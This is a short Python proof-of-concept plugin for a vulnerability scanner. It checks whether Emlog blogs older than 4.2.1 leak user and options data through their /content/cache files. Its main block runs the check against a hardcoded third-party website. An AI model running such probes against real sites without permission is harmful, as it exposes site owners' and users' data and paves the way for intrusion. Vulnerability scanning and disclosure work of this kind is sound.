#!/usr/bin/env python 
# -*- coding: utf-8 -*- 
#__author__ = 'knthony' 
#_name_ = 'Emlog <4.2.1 /content/cache/user 信息泄漏.py'
#Refer: http://www.beebeeto.com/pdb/poc-2014-0177/
def assign(service, arg): 
    if service == "emlog": 
        return True, arg 


def audit(arg):
    payload1 = '/content/cache/user'
    payload2 = '/content/cache/options'
    url1 = arg + payload1
    url2 = arg + payload2
    code, head,res, errcode, _ = curl.curl2(url1) 
    code1, head1,res1, errcode1, _ = curl.curl2(url2) 
    if code == 200  and code1==200 and arg in res1 and "avatar" in res: 
        security_note(url1+'and '+url2)


if __name__ == '__main__': 
    from dummy import * 
    audit(assign('emlog', 'http://www.damicms.com/')[1])